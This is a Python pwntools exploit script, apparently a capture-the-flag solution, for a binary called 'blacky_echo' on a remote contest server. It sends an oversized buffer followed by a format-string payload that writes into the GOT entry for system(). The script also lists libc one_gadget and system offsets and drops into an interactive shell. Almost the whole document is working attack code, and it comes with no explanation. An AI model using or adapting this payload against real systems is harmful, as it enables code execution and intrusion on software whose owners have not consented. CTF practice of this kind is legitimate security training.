#!/usr/bin/env python
from pwn import *

#context.log_level = "DEBUG"

PATCH = False
LOCAL = False
DEBUG = False

SZ = 0x2003f
e = ELF("./blacky_echo", checksec=False)

"""
libc version:       libc6_2.27-3ubuntu1_amd64
one_gadget offsets: 0x4f322
system() offset:    0x4f440
"""

if __name__ == "__main__":
    if PATCH:
        os.system("patchelf --set-interpreter /home/user/libc-ld.so/libc-2.27/64bit/ld.so.2 blacky_echo" )
        os.system("patchelf --set-rpath /home/user/libc-ld.so/libc-2.27/64bit/ blacky_echo")

    if LOCAL:
        p = process(e.path)
    else:
        p = remote("challs.m0lecon.it", 9011)
        DEBUG = False

    if DEBUG:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(p, """
                set follow-fork-mode parent
                handle SIGALRM ignore
                """)
        
    p.recvuntil("Size: ")
    p.sendline(str(SZ).encode())

    p.recvuntil("Input: ")

    payload  = b"A" * 0x1000a
    payload += b"%62221c%12$hn"
    payload += b"B" * 6
    payload += p64(e.got["system"])

    p.sendline(payload)
    p.interactive()